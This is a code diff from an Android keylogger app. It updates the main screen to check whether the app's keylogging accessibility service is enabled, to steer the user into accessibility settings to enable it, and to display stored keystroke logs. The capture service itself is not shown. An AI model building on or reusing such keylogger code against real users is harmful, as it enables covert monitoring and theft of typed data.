@@ -1,28 +1,69 @@
 package com.gpow.androidkeylogger;
 
-import android.app.Activity;
-import android.app.Application;
+import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ServiceInfo;
 import android.preference.PreferenceManager;
 
-import androidx.annotation.NonNull;
-import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.view.View;
+import android.view.accessibility.AccessibilityManager;
 import android.widget.Button;
 import android.widget.TextView;
 
+import java.util.List;
+
 public class MainActivity extends AppCompatActivity {
+
+    private View popupAccessibilityView;
+    private View changeAccessibilityView;
+    private Button refreshButton;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        getSupportActionBar().hide();
         updateText();
         setupDisclaimer();
-        setupRefreshButton();
+        setupView();
+
+        checkForAccessibility();
+    }
+
+    @Override
+    protected void onRestart() {
+        super.onRestart();
+        checkForAccessibility();
+    }
+
+    void checkForAccessibility() {
+
+        if (!isAccessibilityServiceEnabled(this, KeyLoggerAccessibilityService.class)) {
+            popupAccessibilityView.setVisibility(View.VISIBLE);
+        }
+        else {
+            popupAccessibilityView.setVisibility(View.GONE);
+        }
+    }
+
+
+    static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
+        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
+        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
+
+        for (AccessibilityServiceInfo enabledService : enabledServices) {
+            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
+            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
+                return true;
+        }
+
+        return false;
     }
 
 
@@ -54,8 +95,28 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    private void setupRefreshButton() {
-        Button refreshButton = (Button)findViewById(R.id.refreshButton);
+    private void setupView() {
+
+        // Setup ignore accessibility view
+        popupAccessibilityView = findViewById(R.id.accessibility_popup);
+        popupAccessibilityView.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                findViewById(R.id.accessibility_popup).setVisibility(View.GONE);
+            }
+        });
+
+        changeAccessibilityView = findViewById(R.id.accessibility_modify);
+        changeAccessibilityView.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivity(intent);
+            }
+        });
+
+        // Setup Refresh Button
+        refreshButton = (Button)findViewById(R.id.refreshButton);
         refreshButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -78,4 +139,6 @@ public class MainActivity extends AppCompatActivity {
         String logs = preferences.getString("KeyLogger", "No logs found");
         return logs;
     }
+
+
 }
